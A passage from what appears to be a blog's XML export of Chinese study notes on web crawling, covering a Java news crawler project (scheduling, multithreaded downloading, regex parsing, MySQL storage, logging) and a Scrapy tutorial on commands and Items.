/* 配置相关参数，包括集群名称：标识连接哪个es集群，是否开启嗅探 其嗅探功能使用效果并不理想，还是以直接显式添加服务节点 */ Settings settings = Settings.builder() .put(&quot;cluster.name&quot;,&quot;tianliangedu&quot;) .put(&quot;client.transport.sniff&quot;,true); //将参数应用到某个client对象中 } //将指定的map对象索引到指定的索引名称和类型当中 public void addOneDocument(String indexName,String typeName,Map map){ //通过map定义kv结构数据对象 Map xxx //将数据发送到服务器端 this.client.prepareIndex(indexName,typeName,xx) .execute().actionGet(); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>编程</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天亮爬虫学习笔记02]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A9%E4%BA%AE%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002%2F</url>
    <content type="text"><![CDATA[实时新闻采集器 天亮爬虫篇--中级篇 今日头条早些年完全是爬虫，现在是厂家来爬它 maven WebSpiderMiddle4Job001(); &lt;!-- 仓库源配置 --&gt; nexus aliyun &lt;!-- 依赖包 --&gt; &lt;dependencies&gt; &lt;!-- 项目打包与发布 --&gt; com.tianliangedu.job001.ui UIManager(); com.tianliangedu.job001.schedule TaskScheduleManager(); //负责任务调度 com.tianliangedu.job001.download com.tianliangedu.job001.parser com.tianliangedu.job001.persistence com.tianliangedu.job001.utils StaticValue(); //存放项目当中的静态变量 ReadConfigUtil(); //读取配置文件的工具类,既支持直接读取classpath下的，也支持读取外置配置文件 IOUtil(); WebPageDownloadUtil(); //用于下载给定任意网址后对应的html代码 WebCharsetDetectorUtil(); //拿charset RegexUtil(); com.tianliangedu.job001.pojos 放不持久化类 UrlTaskPojo(); com.tianliangedu.job001.pojos.entity 与数据库一一对应起来 com.tianliangedu.job001.controller seeds.txt 不放在resouces里面 resources //git化管理 192.168.1.14 在gitlab，-&gt;your projects挑一个点进去-&gt; groups -&gt;挑一个-&gt;new project -&gt;project name:WebSpiderMiddle4jonb001 Project desription(optional): 将源码xxx与gitlab项目进行正规的版本化操作 复制http //git init eclipse-&gt;右键项目-&gt;Team-&gt;Share Project-&gt;Git-&gt; 选中Use or create ... 取消里面的项目选中状态 点击Create Repository，来创建本地版本库-&gt;Finish 右键项目-&gt;Team-&gt;Commit... 勾选pom.xml 上方message写上：项目环境搭建与包初始化,项目的第一次提交 commit 右键项目-&gt;Team-&gt;Remote-&gt;Push Source ref: xxx/master. (在本地默认是master) Destination ref: xxx/dev_v1(存放的位置) Add. -&gt;next-&gt;finish 自定义编辑author 注释方法 种子文件读取工具类： public class UIManager{ public UrlTaskPojo getRootUrlByDirect(){ return UrlTaskPojo(StaticValue.rootTitle,StataicValue.rootUrl); } public UrlTaskPojo getRootUrlByStaticValue(){ return new UrlTaskPojo(StaticValue.rootTitle,StataicValue.rootUrl); } public List&lt;UrlTaskPojo&gt; getRootUrlBySeedFile(String dataFilePath,boolean isClassPath){ //这里改为封装类，里面至少包含title,url List&lt;String&gt; lineList = IOUtil.readFileToList(dataFilePath,isClassPath,StaticValue.defaultEncoding); List&lt;UrlTaskPojo&gt; resultTaskPojo = xx; for(String line:lineList){ line = line.trim(); if(line.length() &gt; 0 &amp;&amp; !line.startsWith(&quot;#&quot;)){ String[] columnArray = line.split(&quot;\\s&quot;); if(columnArray.length == 2){ UrlTaskPojo tempPojo = new UrlTaskPojo(columnArray[0].trim(),columnArray[1].trim()); resultTaskPojo.add(tempPojo); }else{ sout.err(); throw new Exception(&quot;&quot;); } } } return resultTaskPojo; } public static void addSeedurlsToTaskSchedule(){ xxx } } public class StaticValue{ public static String rootUrl = &quot;http://xxx&quot;; //默认读取文件的编码设置 defaultEncoding = &quot;utf-8&quot;; rootTitle = &quot;&quot;; //分隔符号静态设置 sep_next_ling = &quot;\n&quot;; } //种子文件放在哪里？ //resource里面的话jar包不解它就会没有，这里分内置和外置 seeds.txt #这是我的种子文件，请按格式添加 中国青年网-国内新闻 http://news.youth.cn/gn/ public class ReadConfigUtil{ psvm(){ //1.配置文件路径 String configPath = &quot;seeds.txt&quot;; //2.配置文件的读取模式,是classpath还是系统路径 boolean isClassPath = true; //3.正式进行文件读取 InputStream is = ReadConfigUtil.class.getClassLoader().getResourceAsStream(configPath); 流读取 } } public class ReadConfigUtil{ public static List&lt;String&gt; readFileToList(String filePath,boolean isClassPath,String charset){ InputStream is = null; if(isClassPath){ //3.正式进行文件读取 is = ReadConfigUtil.class.getClassLoader().getResourceAsStream(filePath); }else{ is = new FileInputStream(filePath); } 流读取 return lineList; } psvm() throws IOException{ //1.数据配置文件路径 String configPath = &quot;seeds.txt&quot;; //2.数据配置文件的读取模式,是classpath还是系统路径 boolean isClassPath = true; //3.正式进行文件读取 List&lt;String&gt; lineList = readFileToList(configPath,isClassPath,StaticValue.encoding); 流读取 } } 放在resources里面的话会打包里，一般不好修改，数据大部分是外置的,所以放在项目最外面即可,即非classPath if(isClassPath){ //3.正式进行文件读取 is = ReadConfigUtil.class.getClassLoader().getResourceAsStream(filePath); }else{ is = new FileInputStream(filePath); } public class UrlTaskPojo{ private String title; private String url; public UrlTaskPojo(){ } public UrlTaskPojo(String title,String url){ xxxx } setter and getter } public class TaskScheduleManager{ public static LinkedList&lt;UrlTaskPojo&gt; todoTaskPojoList = new LinkedList &lt;UrlTaskPojo&gt;(); //优先级高的从头部加，低的从尾部加 public static LinkedList&lt;UrlTaskPojo&gt; doneTaskPojoList = new LinkedList &lt;UrlTaskPojo&gt;(); public static void addUrlTaskPojoList(List&lt;UrlTaskPojo&gt; todoTaskList){ todoTaskPojoList.addAll(todoTaskList); } public static void addOneUrlTaskPojoList(UrlTaskPojo todoTask){ todoTaskPojoList.add(todoTask); } public static void addDoneUrlTaskPojoList(UrlTaskPojo todoTask){ doneTaskPojoList.add(todoTask); } public static void removeUrlTaskPojoList(List&lt;UrlTaskPojo&gt; removeTaskList){ todoTaskPojoList.removeAll(removeTaskList); } public static void removeOneUrlTaskPojoList(UrlTaskPojo removeTaskList){ todoTaskPojoList.remove(removeTaskList); } public static UrlTaskPojo take(){ UrlTaskPojo taskPojo = todoTaskPojoList.pollFirst(); return taskPojo; } } URL_Connection 下载html: public class WebPageDownloadUtil{ psvm(){ url = &quot;&quot; URL urlObj = new URL(url); charset URLConnection urlConnection = urlObj.openConnection(); HttpURLConnection xxx InputStream is = urlConnection.getInputStream(); 读取流 } } public class WebCharsetDetectorUtil{ psvm(){ //header寻找charset urlConnection.getHeader.... map //当header和meta冲突的时候以header为准。 //在header找不到一般在meta找 String findCharset = null; header. key value //如果header没找到，则启用meta寻找 if(findCharset == null){ is while((line=br.readLine())!=null){ line = line.toLowerCase(); } } } } public class RegexUtil{ getMatchText(String input ,String regex,int groupIndex){ //String line = &quot;xxx&quot;; //String regex = &quot;charset=[\&quot;]*([\\s\\S]*?)[\&quot;&gt;]; Patten Matcher if(matcher.find()){ return matcher.group(groupIndex); //根据括号来看的组 } return findCharset==null?xx:xx; } } //24集 多线程 com.tianliangedu.job001.ui UIManager(); com.tianliangedu.job001.schedule TaskScheduleManager(); //负责任务调度 DownLoadManager(); com.tianliangedu.job001.download com.tianliangedu.job001.iface.parser NewsItemParserInterface(); com.tianliangedu.job001.iface.download DownloadInterface(); DownLoadRunnable(); 下载线程 com.tianliangedu.job001.parser HtmlParserManager(); com.tianliangedu.job001.persistence com.tianliangedu.job001.utils StaticValue(); //存放项目当中的静态变量 ReadConfigUtil(); //读取配置文件的工具类,既支持直接读取classpath下的，也支持读取外置配置文件 IOUtil(); WebPageDownloadUtil(); //用于下载给定任意网址后对应的html代码 WebCharsetDetectorUtil(); //拿charset RegexUtil(); ReadConfigUtil(); //读配置文件的工具类 SystemConfigParas(); //系统配置参数工具类 com.tianliangedu.job001.pojos 放不持久化类 UrlTaskPojo(); com.tianliangedu.job001.pojos.entity 与数据库一一对应起来 com.tianliangedu.job001.controller resources spider.properties 1.继承Thread 优点：简单，直接，可起动 缺点：java是单继承，影响本类的后续继承扩展性 2.实现Runnable接口 优点：实现接口，对后续继承扩展性无影响 缺点：不如Thread直接 3.线程的状态 新建-&gt;就绪-&gt;运行-&gt;阻塞（等待/挂起）-&gt;死亡 public class DownLoadRunnable implements Runnable{ //线程可以运行的标志变量 private boolean enableRunningFlag = true; //static对类而言一停全停一跑全跑 getter and setter //线程运行的入口方法 @Override public void run(){ while(enableRunningFlag){ UrlTaskPojo taskPojo = TaskscheduleManager.take(); if(taskPojo!=null){ String html; if(html != null){ }else{ } }else{ sout(&quot;none receive seed&quot;); Thread.sleep(2); } sout(); } } } ThreadGroup 使用示例： ThreadGroup threadGroup = new ThreadGroup(&quot;spider_group&quot;); int count = 5; for(int i = 1 ; i &lt;= count ; i ++){ DownloadRunnable oneRunnable = new DownloadRunnable(&quot;&quot;); new Thread(threadGroup,oneRunnable,&quot;thread_&quot; + i).start(); } Thread[] threadArray = new Thread[threadGroup.activeCount()]; for(int i=0;i&lt;3;i++){//检测3次 Thread.sleep(3); sout(threadGroup.activeCount()); threadGroup.enumerate(threadArray); for(Thread t:threadArray){ sout(); } } 集合方法管理线程组： 标志位在run里面结束 DownloadManager{ for(Runnable oneRun:runnableList){ DownloadRunnable tmepObj = (DownloadRunnable)oneRun; tmpObj.setEnableRunningFlag(false);//管理线程结束 sout(); } } public class DownLoadManager{ //线程组初始化 public static ThreadGroup_tGroup = new ThreadGroup(&quot;下载线程组&quot;); //线程组之Runnable管理的集合对象 public static List&lt;DownLoadRunnable&gt; runnableList = new ArrayList&lt;&gt;(); //开启多少个下载线程 public static void start(){ int consumerNumber = 3; List&lt;Runnable&gt; runnableList = new ArrayList&lt;Runnable&gt;(); for(int i = 1 ; i &lt;= consumerNumber ; i++){ DownLoadRunnable oneRunnable = new DownLoadRunnable(&quot;&quot;); new Thread(tGroup,oneRunnable,&quot;&quot;); runnableList.add(oneRunnable); } } //获取线程的状态信息-多少个活着的下载线程 public static int getActiveDownLoadThreads(){ return tGroup.activeCount(); } //一共初始化了多少个线程 public static int getInitDownLoadThreads(){ return initConsumerNumber; } //停止掉所有线程 public static void stopAllThreads(){ for(DownLoadRunnable runnable:runnableList){ runnable.setEnableRunningFlag(false); } } } 配置文件工具类： spider.properties utf-8 # 爬虫的配置文件 #针对download设置的配置参数 init_consumer_number=3 #每次遇到空任务时候的睡眠时间，单位为秒 sleep_time_for_empty=2000 //调用 ReadConfigUtil public class ReadConfigUtil{ //初始化javase自带的配置文件读取工具类 private Properties configObj = new Properties(); public ReadConfigUtil(String configFilePath){ //配置文件读取顺序，1:系统文件路径，2.classpath路径 File configFile = new File(configFilePath); Reader reader = null; InputStream is = null; if(configFile.exists()){ is = new FileInputStream(configFile); reader = new InputSteamreader(is); configObj.load(fis); }else{ is = ReadConfigUtil.class.getClassLoader.... reader = new ...; configObj.load(is); }finally{ is.close(); } } public String getValue(String key){ return configObj.getProperty(key); } psvm(){ String xxxpath = &quot;spider.properties&quot;; .... } } public class SystemConfigParas{ //初始化参数读取的工具类实例 public static ReadConfigUtil configUtil = null; static{ configUtil = new ReadConfigUtil(&quot;spider.properties&quot;); } //集中读取download相关的参数 public static int init_consumer_number = ....getValue(); sleep_time_for_empty } public class HtmlParserManager{ psvm(){ String url = &quot;&quot;; String htmlSource = &quot;&quot;; //1.先拿到小范围的数据块 String blockRegex = &quot;&lt;div class=\&quot;main_1\&quot;&gt;([\\s\\S]*)&lt;div class=\&quot;main_r\&quot;&quot;; getMatchText(htmlSource,blockRegex,0); //2.开始逐条拿匹配块 while(matcher.find()){ //先获取准确标题 String titleRegex = &quot;&quot;; String title = xxxx; ... } sout(); } } public class RegexUtil{ public static String getMatchText(String input ,String regex,int groupIndex){ Pattern Matcher if(matcher.find()){ return matcher.group(groupIndex); } return null; } } title postTimeString. //发布时间 sourceURL insertDate //插入时间 postDateObj //发布时间另一种形式 public interface NewsItemParserInterface{ } String getChildElementValue(Element element,int childIndex,ContentSelectType contype){ String value = null; switch(contentType){ case OUTHER_HTML: value = element.child(childIndex).outerHtml(); break; case... } } com.tianliangedu.job001.iface.persistence public class DataPersistenceInterface{ //数据持久化接口类 private DataBaseUtil dataBaseUtil; public DataPersistenceInterface(){ } //批量保存 public boolean persist(List&lt;NewsItemEntity&gt; itemEntity); //单条保存 public boolean persist(NewsItemEntity itemEntity); } DataPersist4MySqlImpl implements xxxInterface{ @Override public boolean persist(NewsItemEntity itemEntity){ DataBaseUtil dbutil = new DataBaseUtil(driver,url,username,password); xxxx ps.executeUpdate(); } } //乱码解决： show variables like &apos;character_set%&apos; mysql配置： my-default.ini default-character-set=utf8 init_connect=&apos;set names utf8&apos; my.ini character-set-server=utf8 jdbc参数： mybatis.proerties //TODO 线程问题 //TODO //监控日志管理系统 MonitorManager{ }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>编程</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天亮爬虫学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A9%E4%BA%AE%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[05实时新闻采集 天亮爬虫篇--初级篇 五大门户：新浪新闻，网易，腾讯，搜狐，凤凰 中国青年网是国内用户群体最广泛，体量最大，权威度最高，集新闻编撰，发布，传播为一体的新闻数据中心。 http://news.youth.cn/gn/ 采集要求： 数据字段要求 新闻标题，发布时间，数据插入数据库的时间 首次采集 因为新闻数据量巨大，机器和带宽有限，故只采集前5页即可，并存储到mysql数据库中 增量采集 当首次采集的5页完成后，定时周期性每隔1分钟增量采集一次，将新出现的新闻条目采集下去，并存储到mysql数据库即可 采集日志输出要求 日志当中，要能一直输出当前共采集多少条新闻，当天共采集多少条新闻 主要思路： 通过javase+maven+httpclient数据集组件+正则+mysql综合实现 数据采集器的开发流程：主要包括提交任务的用户接口层，任务调度层，网络爬取层，数据解析层，数据持久化层，共5个主要层，再循环至任务调度层的过程 模块间解耦设计，模块间通过类或方法来衔接串联，最终形成完整的系统。 //任务调度层：解决先后采集等策略问题 //递归采集分深度优先和广度优先 主要考点： 项目分析与开发过程熟悉 javase程序设计基础 面向对象程序设计 maven项目构建和开发 httpclient api学习和使用 正则 mysql操作 爬虫相关博文链接： https://blog.csdn.net/erliang20088/article/details/45790263?locationNum=7&amp;fps=1 https://blog.csdn.net/erliang20088/article/details/45790201 https://blog.csdn.net/erliang20088/article/details/45790103 https://blog.csdn.net/erliang20088/article/details/45790253 简单页面：是指没有异步请求的页面。 nlp: 句法分析 itp 哈工大 数据挖掘： 基于nlp基础 HttpURLConnection底层是socket HttpClient底层是httpURLConnection SimpleYouthNewsSpider &lt;!-- 首先配置仓库的服务器位置，首选阿里云，也可以配置镜像方式 --&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;name&gt;Nexus iliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/xxxx&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;!-- 引入hadoop-cli-2.7.4依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt; &lt;version&gt;2.7.4&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; hive ... &lt;/dependencies&gt; &lt;build&gt;打包的&lt;/build&gt; package一般是5层 com.tl.spider.ui UIManager(); com.tl.spider.schedule com.tl.spider.download com.tl.spider.parser com.tl.spider.utils resources seeds.txt /* 负责爬虫系统对外开放接口的设计 */ public class UIManager{ //拿到系统运行的种子 public static String getSeedUrl(){ return &quot;http://news.youth.cn/gn/&quot;; } //拿到系统运行的种子通过文件加载的方式 public static List&lt;String&gt; getSeedUrlFromFile(){ String seedFilePath = &quot;seeds.txt&quot;; List&lt;String&gt; seedUrlList=FileOperatorUtil.getList(); } public static String readFromFile(String filePath,String charset){ File fileObj = new File(filePath); FileInputStream fis = new FileInputStream(fileObj); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); StringBuilder stringBuilder = new StringBuilder(); String temp = null; int lineCounter=0;// StringBuilder会多一行 while(temp=br.readLine()!=null){ if(lineCounter &gt; 0){ stringBuilder.append(&quot;\n&quot;); } lineCounter ++; stringBuilder.append(temp); } br.close(); return stringBuilder.toString(); } public static List&lt;String&gt; readFromFile(String filePath,String charset) throws Exception{ File fileObj = new File(filePath); FileInputStream fis = new FileInputStream(fileObj); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); StringBuilder stringBuilder = new StringBuilder(); String temp = null; List&lt;String&gt; lineList = new ArrayList&lt;String&gt;(); while(temp=br.readLine()!=null){ temp = temp.trim(); if(temp.length() &gt; 0){ lineList.add(temp); } } br.close(); return stringBuilder.toString(); } psvm(){ } } //seeds.txt http://news.youth.cn/gn/ URL. 里面有个.openStream()。 返回InputStream ..... 拿到html后 //负责接收外部传过来的url任务，通过一定的分发策略，将相应的url任务分发到采集任务中 public class ScheduleManager{ public static List&lt;UrlTaskPojo&gt; todoTaskList = new LinkedList&lt;&gt;(); // public static List&lt;UrlTaskPojo&gt; xxx(xxx){ //将种子url加入到待采集队列 return null; } } 去重： 添加种子的时候要去重 remove的时候也要去重 public static Set&lt;String&gt; todoTaskUrl = new HashSet&lt;String&gt;(); if(todoTaskUrl.contains(seedUrl)){ return false; } todoTaskUrlSet.remove(url); mysql插入数据 maven依赖： mysql-connector-java 5.1.40 批量插入数据： PreparedStatement ps = conn.prepareStatement(sql); ps.addBatch(); for(xxx:xxx){ ps.set... ps.addBatch(); } ps.executeBatch(); //25 前5页采集 周期采集 一次采集步骤： 1.拿种子 2.交给任务调度层，用于后续的下载分发 3.下载拿到的url，没有则返回空 4.解析下载下来的htmlsource 5.对解析出来的对象进行持久化 3. String htmlSource = DownLoadManager.download(); while(htmlSource != null){ 4. 5. 3. } while(true){ 12345. Thread.sleep(10*1000); } 将定时循环次数放在配置文件里面 增量采集： //用于保存已采集过的url的任务集合donwTaskSet public static Set&lt;String&gt; doneTaskSet = new HashSet&lt;String&gt;(); 在持久化的时候 //filed:01 （不建议） for(xxx:xxx){ //加入到已采集任务集合当中 } //filed:02 (这种方式更符合业务逻辑) //在5.步的时候 DataPersistenceManager.persist(resultEntityList); //将已入库完成的entity数据，加入到已采集数据的set当中，用于判断是否已采集过数据，最终实现增量采集 ScheduleManager.addUrlToDoneTaskSet(resultEntityList); htmlSource = DownLoadManager.download(); public static void addUrlToDoneTaskSet(List&lt;ParserResultEntity&gt; resultEntityList){ for(ParserResultEntity entity:resultEntityList){ addUrlToDoneTaskSet(entity.getSourceUrl()); } } //在4.步到5.步时判断是否需要添加重复的数据持久化 3种方法判断 在4上，在5上，在4～5之间判断（优） 4. //加入增量采集的判断 boolean isFindRepeatData = false; List&lt;ParserResultEntity&gt; resultEntityListFinal = new ArrayList&lt;ParserResultEntity&gt;(); for(ParserResultEntity entity:resultEntityList){ if(ScheduleManager.isHaveDone(entity.getSourceUrl)){ isFindRepeatData = true; break; } ParserResultEntityFinal.add(entity); } //scheduleManager.java public static boolean isHaveDone(String url){ return doneTaskSet.contains(url); } 5. DataPersistenceManager.persist(resultEntityListFinal); ScheduleManager.addUrlToDoneTaskSet(resultEntityList); //循环下载，直到不存在待采集任务 if(isFindRepeatData){ ScheduleManager.clearToDoTaskList(); sout(&quot;发现重复&quot;); break; } htmlSource = DownLoadManager.download(); //ScheduleManager.java public static void clearToDoTaskList(){ todoTaskUrlSet.clear(); todoTaskUrlList.clear(); } log4j reg：介绍 https://www.cnblogs.com/franson-2016/p/5640427.html log4j maven 修改log4j.properties. 一般maven文件都放在resources下 要自己新建 UTF-8 log4j.rootLogger = DEBUG,stdout,file //这里不写info,表示DEBUG级以上的信息全部显示出来 .File = 路径 .MaxFileSize = 5MB 每隔多少M写一个新的文件 TestLog4j{ public static Logger logger = Logger.getLogger(TestLog4j.class); psvm(){ logger.info(&quot;123&quot;); } } 将其放入爬虫： manager StatisticManager(); public class StaticManager{ public static Logger logger=Logger.getLogger(StatisticManager.class); public static void logStatistic(){ logger.info(SchedulaManager.xxxx); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>编程</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2Fscrapy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[scrapy学习 创建项目 scrapy startproject tutorial 该命令将会创建包含下列内容的 tutorial 目录: scrapy.cfg: 项目的配置文件 tutorial/: 该项目的python模块。之后您将在此加入代码。 tutorial/items.py: 项目中的item文件. tutorial/pipelines.py: 项目中的pipelines文件. tutorial/settings.py: 项目的设置文件. tutorial/spiders/: 放置spider代码的目录. Item 是保存爬取到的数据的容器 编辑 tutorial 目录中的 items.py 文件: import scrapy class DmozItem(scrapy.Item): title = scrapy.Field() link = scrapy.Field() desc = scrapy.Field() Spider是用户编写用于从单个网站(或者一些网站)爬取数据的类。 必须继承 scrapy.Spider 类, 且定义以下三个属性 name: start_urls: parse() 以下为我们的第一个Spider代码，保存在 tutorial/spiders 目录下的 dmoz_spider.py 文件中: import scrapy class DmozSpider(scrapy.Spider): name = &quot;dmoz&quot; allowed_domains = [&quot;dmoz.org&quot;] start_urls = [ &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;, &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot; ] def parse(self, response): filename = response.url.split(&quot;/&quot;)[-2] with open(filename, &apos;wb&apos;) as f: f.write(response.body) 启动爬虫： scrapy crawl dmoz parse: Scrapy使用了一种基于 XPath 和 CSS 表达式机制: Scrapy Selectors Selector有四个基本的方法(点击相应的方法可以看到详细的API文档): xpath(): 传入xpath表达式，返回该表达式所对应的所有节点的selector list列表 。 css(): 传入CSS表达式，返回该表达式所对应的所有节点的selector list列表. extract(): 序列化该节点为unicode字符串并返回list。 re(): 根据传入的正则表达式对数据进行提取，返回unicode字符串list列表。 Scrapy Shell需要您预装好IPython(一个扩展的Python终端)。 scrapy shell &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot; *当您在终端运行Scrapy时，请一定记得给url地址加上引号，否则包含参数的url(例如 &amp; 字符)会导致Scrapy运行失败。 当shell载入后，您将得到一个包含response数据的本地 response 变量。输入 response.body 将输出response的包体， 输出 response.headers 可以看到response的包头。 response.xpath(&apos;//title&apos;).extract() 在我们的spider中加入这段代码: import scrapy class DmozSpider(scrapy.Spider): name = &quot;dmoz&quot; allowed_domains = [&quot;dmoz.org&quot;] start_urls = [ &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;, &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot; ] def parse(self, response): for sel in response.xpath(&apos;//ul/li&apos;): title = sel.xpath(&apos;a/text()&apos;).extract() link = sel.xpath(&apos;a/@href&apos;).extract() desc = sel.xpath(&apos;text()&apos;).extract() print title, link, desc 现在尝试再次爬取dmoz.org，您将看到爬取到的网站信息被成功输出: 使用Item： Item 对象是自定义的python字典。 一般来说，Spider将会将爬取到的数据以 Item 对象返回。所以为了将爬取的数据返回 我们最终的代码将是: import scrapy from tutorial.items import DmozItem class DmozSpider(scrapy.Spider): name = &quot;dmoz&quot; allowed_domains = [&quot;dmoz.org&quot;] start_urls = [ &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;, &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot; ] def parse(self, response): for sel in response.xpath(&apos;//ul/li&apos;): item = DmozItem() item[&apos;title&apos;] = sel.xpath(&apos;a/text()&apos;).extract() item[&apos;link&apos;] = sel.xpath(&apos;a/@href&apos;).extract() item[&apos;desc&apos;] = sel.xpath(&apos;text()&apos;).extract() yield item 保存爬取到的数据 最简单存储爬取的数据的方式是使用 Feed exports: scrapy crawl dmoz -o items.json 如果需要对爬取到的item做更多更为复杂的操作，您可以编写 Item Pipeline 。 类似于我们在创建项目时对Item做的，用于您编写自己的 tutorial/pipelines.py 也被创建。 不过如果您仅仅想要保存item，您不需要实现任何的pipeline。 ）：命令行工具(Command line tools) scrapy.cfg 存放的目录被认为是 项目的根目录 。该文件中包含python模块名的字段定义了项目的设置。 使用 scrapy 工具 步骤： scrapy startproject myproject cd myproject scrapy genspider mydomain mydomain.com scrapy &lt;command&gt; -h scrapy -h 全局命令: startproject settings runspider shell fetch view version 项目(Project-only)命令: crawl check list edit parse genspider deploy bench startproject 在 project_name 文件夹下创建一个名为 project_name 的Scrapy项目。 genspider 在当前项目中创建spider。 scrapy genspider -l scrapy genspider -d basic scrapy genspider -t basic example example.com crawl 使用spider进行爬取。 scrapy crawl myspider check 运行contract检查。 scrapy check -l list 列出当前项目中所有可用的spider。每行输出一个spider。 scrapy list edit 使用 EDITOR 中设定的编辑器编辑给定的spider scrapy edit spider1 fetch 使用Scrapy下载器(downloader)下载给定的URL，并将获取到的内容送到标准输出。 该命令以spider下载页面的方式获取页面。 scrapy fetch --nolog http://www.example.com/some/page.html scrapy fetch --nolog --headers http://www.example.com/ view 在浏览器中打开给定的URL，并以Scrapy spider获取到的形式展现。 scrapy view http://www.example.com/some/page.html shell 以给定的URL(如果给出)或者空(没有给出URL)启动Scrapy shell。 scrapy shell http://www.example.com/some/page.html parse 获取给定的URL并使用相应的spider分析处理。如果您提供 --callback 选项，则使用spider的该方法处理，否则使用 parse 。 scrapy parse http://www.example.com/ -c parse_item settings 获取Scrapy的设定 在项目中运行时，该命令将会输出项目的设定值，否则输出Scrapy默认设定。 $ scrapy settings --get BOT_NAME runspider 在未创建项目的情况下，运行一个编写在Python文件中的spider。 scrapy runspider myspider.py version 输出Scrapy版本。配合 -v 运行时，该命令同时输出Python, Twisted以及平台的信息，方便bug提交。 deploy 将项目部署到Scrapyd服务。查看 部署您的项目 。 import scrapy class Product(scrapy.Item): name = scrapy.Field() price = scrapy.Field() stock = scrapy.Field() last_updated = scrapy.Field(serializer=str) 创建item &gt;&gt;&gt; product = Product(name=&apos;Desktop PC&apos;, price=1000) &gt;&gt;&gt; print product Product(name=&apos;Desktop PC&apos;, price=1000) 获取字段的值 &gt;&gt;&gt; product[&apos;name&apos;] Desktop PC &gt;&gt;&gt; product.get(&apos;name&apos;) Desktop PC &gt;&gt;&gt; product[&apos;price&apos;] 1000 &gt;&gt;&gt; product[&apos;last_updated&apos;] Traceback (most recent call last): ... KeyError: &apos;last_updated&apos; &gt;&gt;&gt; product.get(&apos;last_updated&apos;, &apos;not set&apos;) not set &gt;&gt;&gt; product[&apos;lala&apos;] # getting unknown field Traceback (most recent call last): ... KeyError: &apos;lala&apos; &gt;&gt;&gt; product.get(&apos;lala&apos;, &apos;unknown field&apos;) &apos;unknown field&apos; &gt;&gt;&gt; &apos;name&apos; in product # is name field populated? True &gt;&gt;&gt; &apos;last_updated&apos; in product # is last_updated populated? False &gt;&gt;&gt; &apos;last_updated&apos; in product.fields # is last_updated a declared field? True &gt;&gt;&gt; &apos;lala&apos; in product.fields # is lala a declared field? False 设置字段的值 &gt;&gt;&gt; product[&apos;last_updated&apos;] = &apos;today&apos; &gt;&gt;&gt; product[&apos;last_updated&apos;] today &gt;&gt;&gt; product[&apos;lala&apos;] = &apos;test&apos; # setting unknown field Traceback (most recent call last): ... KeyError: &apos;Product does not support field: lala&apos; &gt;&gt;&gt; product.keys() [&apos;price&apos;, &apos;name&apos;] &gt;&gt;&gt; product.items() [(&apos;price&apos;, 1000), (&apos;name&apos;, &apos;Desktop PC&apos;)] 复制item: &gt;&gt;&gt; product2 = Product(product) &gt;&gt;&gt; print product2 Product(name=&apos;Desktop PC&apos;, price=1000) &gt;&gt;&gt; product3 = product2.copy() &gt;&gt;&gt; print product3 Product(name=&apos;Desktop PC&apos;, price=1000) 根据item创建字典(dict): &gt;&gt;&gt; dict(product) # create a dict from all populated values {&apos;price&apos;: 1000, &apos;name&apos;: &apos;Desktop PC&apos;} 根据字典(dict)创建item: &gt;&gt;&gt; Product({&apos;name&apos;: &apos;Laptop PC&apos;, &apos;price&apos;: 1500}) Product(price=1500, name=&apos;Laptop PC&apos;) &gt;&gt;&gt; Product({&apos;name&apos;: &apos;Laptop PC&apos;, &apos;lala&apos;: 1500}) # warning: unknown field in dict Traceback (most recent call last): ... KeyError: &apos;Product does not support field: lala&apos; 您可以通过继承原始的Item来扩展item(添加更多的字段或者修改某些字段的元数据)。 class DiscountedProduct(Product): discount_percent = scrapy.Field(serializer=str) discount_expiration_date = scrapy.Field() class SpecificProduct(Product): name = scrapy.Field(Product.fields[&apos;name&apos;], serializer=my_serializer) class scrapy.item.Item([arg]) 返回一个根据给定的参数可选初始化的item。 class scrapy.item.Field([arg]) Field 仅仅是内置的 dict 类的一个别名，并没有提供额外的方法或者属性。 Spider 在运行 crawl 时添加 -a 可以传递Spider参数: scrapy crawl myspider -a category=electronics 内置Spider import scrapy class 